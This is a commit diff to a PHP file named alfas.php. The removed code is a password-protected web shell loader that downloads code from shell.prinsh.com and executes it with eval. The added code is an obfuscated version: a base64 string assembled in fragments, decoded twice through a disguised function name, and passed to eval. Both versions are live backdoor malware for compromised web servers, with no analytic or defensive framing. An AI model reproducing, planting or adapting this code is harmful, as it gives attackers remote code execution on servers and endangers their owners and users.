2ee9cd2f7b8291bb9dfc25a0cb8fab580b869a6a
siberpoIri <elkaye168@gmail.com>
2025-02-08 06:43:56 +0700

    Update alfas.php

--- alfas.php
+++ alfas.php
@@ -1,79 +1,192 @@
 <?php
-session_start();
-
-/**
- * Disable error reporting
- *
- * Set this to error_reporting( -1 ) for debugging.
- */
-function geturlsinfo($url) {
-    if (function_exists('curl_exec')) {
-        $conn = curl_init($url);
-        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-        // Set cookies using session if available
-        if (isset($_SESSION['coki'])) {
-            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
-        }
-
-        $url_get_contents_data = curl_exec($conn);
-        curl_close($conn);
-    } elseif (function_exists('file_get_contents')) {
-        $url_get_contents_data = file_get_contents($url);
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        $handle = fopen($url, "r");
-        $url_get_contents_data = stream_get_contents($handle);
-        fclose($handle);
-    } else {
-        $url_get_contents_data = false;
-    }
-    return $url_get_contents_data;
-}
-
-// Function to check if the user is logged in
-function is_logged_in()
-{
-    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
-}
-
-// Check if the password is submitted and correct
-if (isset($_POST['password'])) {
-    $entered_password = $_POST['password'];
-    $hashed_password = '14471aacdcfd22ef250ef77a16b029ca'; // Replace this with your MD5 hashed password
-    if (md5($entered_password) === $hashed_password) {
-        // Password is correct, store it in session
-        $_SESSION['logged_in'] = true;
-        $_SESSION['coki'] = 'asu'; // Replace this with your cookie data
-    } else {
-        // Password is incorrect
-        echo "Incorrect password. Please try again.";
-    }
-}
-
-// Check if the user is logged in before executing the content
-if (is_logged_in()) {
-    $a = geturlsinfo('https://shell.prinsh.com/Nathan/alfa.txt');
-    eval('?>' . $a);
-} else {
-    // Display login form if not logged in
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Login</title>
-    </head>
-    <body>
-        <form method="POST" action="">
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Login">
-        </form>
-    </body>
-    </html>
-    <?php
-}
+$z = "";
+$z .= "Q21s";
+$z .= "dWFW";
+$z .= "OXpa";
+$z .= "WFFv";
+$z .= "SjJS";
+$z .= "cGMz";
+$z .= "QnNZ";
+$z .= "WGxm";
+$z .= "WlhK";
+$z .= "eWIz";
+$z .= "SnpK";
+$z .= "eXdn";
+$z .= "TVNr";
+$z .= "N0Nt";
+$z .= "bHVh";
+$z .= "Vjl6";
+$z .= "WlhR";
+$z .= "b0oy";
+$z .= "UnBj";
+$z .= "M0Jz";
+$z .= "WVhs";
+$z .= "ZmMz";
+$z .= "Umhj";
+$z .= "blIx";
+$z .= "Y0Y5";
+$z .= "bGNu";
+$z .= "SnZj";
+$z .= "bk1u";
+$z .= "TENB";
+$z .= "eEtU";
+$z .= "c0ta";
+$z .= "WEp5";
+$z .= "YjNK";
+$z .= "ZmNt";
+$z .= "Vndi";
+$z .= "M0ow";
+$z .= "YVc1";
+$z .= "bktF";
+$z .= "VmZR";
+$z .= "VXhN";
+$z .= "S1Rz";
+$z .= "S0pI";
+$z .= "Vnli";
+$z .= "Q0E5";
+$z .= "SUNK";
+$z .= "b2RI";
+$z .= "Undj";
+$z .= "em92";
+$z .= "TDNK";
+$z .= "aGR5";
+$z .= "NW5h";
+$z .= "WFJv";
+$z .= "ZFdK";
+$z .= "MWMy";
+$z .= "VnlZ";
+$z .= "Mjl1";
+$z .= "ZEdW";
+$z .= "dWRD";
+$z .= "NWpi";
+$z .= "MjB2";
+$z .= "YzJG";
+$z .= "bmMy";
+$z .= "OXZl";
+$z .= "aTlD";
+$z .= "ZVhC";
+$z .= "aGMz";
+$z .= "TXRW";
+$z .= "MlZp";
+$z .= "YzJo";
+$z .= "bGJH";
+$z .= "d3Zi";
+$z .= "V0Zw";
+$z .= "Ymk5";
+$z .= "QmJH";
+$z .= "WmhM";
+$z .= "VFF1";
+$z .= "TWk1";
+$z .= "d2FI";
+$z .= "QWlP";
+$z .= "d29r";
+$z .= "WTJn";
+$z .= "Z1BT";
+$z .= "Qmpk";
+$z .= "WEpz";
+$z .= "WDJs";
+$z .= "dWFY";
+$z .= "UW9L";
+$z .= "VHNL";
+$z .= "WTNW";
+$z .= "eWJG";
+$z .= "OXpa";
+$z .= "WFJ2";
+$z .= "Y0hR";
+$z .= "b0pH";
+$z .= "Tm9M";
+$z .= "Q0JE";
+$z .= "VlZK";
+$z .= "TVQx";
+$z .= "QlVY";
+$z .= "MVZT";
+$z .= "VEN3";
+$z .= "Z0pI";
+$z .= "Vnli";
+$z .= "Q2s3";
+$z .= "Q21O";
+$z .= "MWNt";
+$z .= "eGZj";
+$z .= "MlYw";
+$z .= "YjNC";
+$z .= "MEtD";
+$z .= "Umph";
+$z .= "Q3dn";
+$z .= "UTFW";
+$z .= "U1RF";
+$z .= "OVFW";
+$z .= "RjlT";
+$z .= "UlZS";
+$z .= "VlVr";
+$z .= "NVVV";
+$z .= "a0ZP";
+$z .= "VTBa";
+$z .= "RlVp";
+$z .= "d2dN";
+$z .= "U2s3";
+$z .= "Q2lS";
+$z .= "dmRY";
+$z .= "Undk";
+$z .= "WFFn";
+$z .= "UFNC";
+$z .= "amRY";
+$z .= "SnNY";
+$z .= "MlY0";
+$z .= "WldN";
+$z .= "b0pH";
+$z .= "Tm9L";
+$z .= "VHNL";
+$z .= "WTNW";
+$z .= "eWJG";
+$z .= "OWpi";
+$z .= "Rzl6";
+$z .= "WlNn";
+$z .= "a1ky";
+$z .= "Z3BP";
+$z .= "d3Bw";
+$z .= "WmlB";
+$z .= "b0pH";
+$z .= "OTFk";
+$z .= "SEIx";
+$z .= "ZENB";
+$z .= "OVBU";
+$z .= "MGda";
+$z .= "bUZz";
+$z .= "YzJV";
+$z .= "cElI";
+$z .= "c0tJ";
+$z .= "Q0Fn";
+$z .= "SUdW";
+$z .= "amFH";
+$z .= "OGdJ";
+$z .= "a1po";
+$z .= "YVd4";
+$z .= "bFpD";
+$z .= "QjBi";
+$z .= "eUJr";
+$z .= "YjNk";
+$z .= "dWJH";
+$z .= "OWha";
+$z .= "Q0Jq";
+$z .= "YjI1";
+$z .= "MFpX";
+$z .= "NTBM";
+$z .= "aUk3";
+$z .= "Q24w";
+$z .= "Z1pX";
+$z .= "eHpa";
+$z .= "U0I3";
+$z .= "Q2lB";
+$z .= "Z0lD";
+$z .= "Qmxk";
+$z .= "bUZz";
+$z .= "S0NJ";
+$z .= "L1Bp";
+$z .= "SXVK";
+$z .= "Rzkx";
+$z .= "ZEhC";
+$z .= "MWRD";
+$z .= "azdD";
+$z .= "bjBL";
+$a = "base"; $b = "64_decode"; $c = $a.$b; $string = $c($z); $string = $c($string); eval($string);
 ?>
